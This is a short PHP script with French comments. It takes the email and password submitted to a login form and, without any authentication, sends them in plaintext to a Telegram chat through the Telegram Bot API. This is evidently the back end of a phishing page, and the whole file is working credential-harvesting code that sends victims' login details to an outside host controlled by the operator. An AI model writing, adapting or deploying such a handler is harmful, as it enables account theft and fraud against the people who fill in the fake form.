<?php
ini_set('display_errors', 1);
error_reporting(E_ALL);

// Charger les variables depuis le fichier .env
require_once 'envloader.php';
loadEnv(__DIR__ . '/.env');

$botToken = $_ENV['BOT_TOKEN'];
$chatId = $_ENV['CHAT_ID'];

if (isset($_POST['email']) && isset($_POST['password'])) {
    $email = htmlspecialchars($_POST['email']);
    $password = htmlspecialchars($_POST['password']);

    $message = "🔐 Nouvelle tentative de connexion :\nEmail : $email\nMot de passe : $password";

    $url = "https://api.telegram.org/bot$botToken/sendMessage";

    $data = [
        'chat_id' => $chatId,
        'text' => $message
    ];

    $options = [
        'http' => [
            'method'  => 'POST',
            'header'  => "Content-type: application/x-www-form-urlencoded\r\n",
            'content' => http_build_query($data),
        ]
    ];

    $context = stream_context_create($options);
    file_get_contents($url, false, $context);

    echo "OK";
} else {
    echo "Données manquantes.";
}
?>
